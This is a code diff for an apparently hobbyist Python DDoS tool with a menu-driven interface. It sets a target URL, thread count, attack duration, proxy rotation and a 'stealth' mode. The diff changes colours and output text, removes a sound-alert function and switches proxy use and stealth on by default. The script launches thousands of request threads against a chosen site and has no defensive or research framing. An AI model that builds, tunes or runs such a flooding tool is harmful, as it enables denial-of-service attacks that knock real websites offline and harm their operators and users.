@@ -28,17 +28,17 @@ def load_user_agents(file_name):
 PROXY_LIST = load_proxies("proxies.txt")
 USER_AGENTS = load_user_agents("ua.txt")
 
-ascii_art = f"""{Fore.RED}
+ascii_art = f"""{Fore.GREEN}
 
  #                                    #
  ##                                  ##
  ###                                ###
- ## #               #              # ##
- ## ##             ###            ## ##
- ##  ##          ### ###         ##  ##
- ##   ##        ##     ##       ##   ##
- ##    ##     ##         ##    ##    ##
- ##     ##   ##           ##  ##     ##
+ ## #              ##              # ##
+ ## ##            ####            ## ##
+ ##  ##         ###  ###         ##  ##
+ ##   ##       ##      ##       ##   ##
+ ##    ##    ##          ##    ##    ##
+ ##     ##  ##            ##  ##     ##
  ##     #####              #####     ##
  ##      ###                ###      ##
  ##     ####                ####     ##
@@ -75,14 +75,6 @@ def check_website_status(url):
     except:
         return False
 
-def play_sound(strikes, misses):
-    try:
-        sound = "good.wav" if strikes > misses else "bad.wav"
-        wave_obj = sa.WaveObject.from_wave_file(sound)
-        wave_obj.play()  # async
-    except Exception as e:
-        print(f"[!] Audio playback failed: {e}")
-
 def attack(target_url, ip, num_threads, duration, use_proxy, stealth):
     total_strikes = 0
     total_misses = 0
@@ -115,7 +107,7 @@ def attack(target_url, ip, num_threads, duration, use_proxy, stealth):
             if stealth:
                 time.sleep(random.uniform(0.1, 0.3))
 
-    with tqdm(total=num_threads, desc="Launching attack threads", colour="green") as bar:
+    with tqdm(total=num_threads, desc="Launching attack threads", colour="red") as bar:
         threads = []
         for _ in range(num_threads):
             t = threading.Thread(target=make_request)
@@ -127,23 +119,21 @@ def attack(target_url, ip, num_threads, duration, use_proxy, stealth):
     try:
         time.sleep(duration)
     except KeyboardInterrupt:
-        print(f"{Fore.YELLOW}⚠️ Interrupted by user.")
+        print(f"{Fore.YELLOW}Interrupted by user.")
     finally:
         stop_flag.set()
         for t in threads:
             t.join()
 
-    play_sound(total_strikes, total_misses)
-
     return (
-        f"{Fore.GREEN}✅ Attack Complete!\n"
-        f"⏱️ Duration     : {duration} seconds\n"
-        f"🧵 Threads      : {num_threads}\n"
-        f"🎯 IP           : {ip}\n"
-        f"🔥 Hits         : {total_strikes}\n"
-        f"❌ Misses       : {total_misses}\n"
-        f"🛡️ Proxy        : {'Enabled' if use_proxy else 'Disabled'}\n"
-        f"🕶️ Stealth      : {'Enabled' if stealth else 'Disabled'}"
+        f"{Fore.GREEN}Attack Complete!\n"
+        f"Duration     : {duration} seconds\n"
+        f"Threads      : {num_threads}\n"
+        f"IP           : {ip}\n"
+        f"Hits         : {total_strikes}\n"
+        f"Misses       : {total_misses}\n"
+        f"Proxy        : {'Enabled' if use_proxy else 'Disabled'}\n"
+        f"Stealth      : {'Enabled' if stealth else 'Disabled'}"
     )
 
 # Interactive CLI Menu
@@ -152,9 +142,9 @@ def main():
     ip = None
     status = None
     threads = 5000
-    proxy_enabled = False
+    proxy_enabled = True
     duration = 600
-    stealth_mode = False
+    stealth_mode = True
     last_attack_summary = ""
 
     while True:
@@ -162,18 +152,18 @@ def main():
         print_centered(ascii_art)
         print("\nCurrent Settings")
         print(f"Target URL          : {url if url else 'Not Set'}")
-        print(f"🌐 Target IP        : {ip if ip else 'Not Set'}")
-        print(f"🔄 Status           : {'✅ ACTIVE' if status else '❌ NOT Reachable'}" if url else "🔄 Status: Not Set")
+        print(f"Target IP           : {ip if ip else 'Not Set'}")
+        print(f"Status              : {'ACTIVE' if status else 'NOT Reachable'}" if url else "Status: Not Set")
         print(f"Threads             : {threads}")
         print(f"Proxy               : {'Enabled' if proxy_enabled else 'Disabled'}")
         print(f"Stealth Mode        : {'Enabled' if stealth_mode else 'Disabled'}")
         print(f"Duration            : {duration} sec")
 
         if last_attack_summary:
-            print("\n🔥 Last Attack Summary 🔥")
+            print("\nLast Attack Summary")
             print(last_attack_summary)
 
-        print("\n====== 🎭F^ck Society🎭 ======")
+        print("\n====== F^ck Society ======")
         print("\nMenu:")
         print("1. Input Target URL")
         print("2. Set Threads")
@@ -182,7 +172,7 @@ def main():
         print("5. Set Attack Duration")
         print("6. Start Attack")
         print("7. Exit")
-        print("\n=============================")
+        print("\n==========================")
 
         choice = input("Enter choice: ")
 
@@ -191,8 +181,8 @@ def main():
             if url:
                 ip = get_target_ip(url)
                 status = check_website_status(url)
-                print(f"🌐 Target IP: {ip if ip else 'N/A'}")
-                print("✅ Website is ACTIVE." if status else "❌ Website is NOT reachable.")
+                print(f"Target IP: {ip if ip else 'N/A'}")
+                print("Website is ACTIVE." if status else "Website is NOT reachable.")
                 input("Press Enter to continue...")
         elif choice == "2":
             threads = int(input("Enter number of threads: "))
@@ -204,13 +194,13 @@ def main():
             duration = int(input("Enter attack duration in seconds: "))
         elif choice == "6":
             if not url:
-                print("⚠️ Target URL is not set!")
+                print("Target URL is not set!")
                 input("Press Enter to continue...")
             else:
                 last_attack_summary = attack(url, ip, threads, duration, proxy_enabled, stealth_mode)
                 input("Press Enter to view results...")
         elif choice == "7":
-            print("\n--👿 DDOS Terminated 👿--")
+            print("\n--DDOS Terminated--")
             break
         else:
             print("Invalid choice! Try again.")
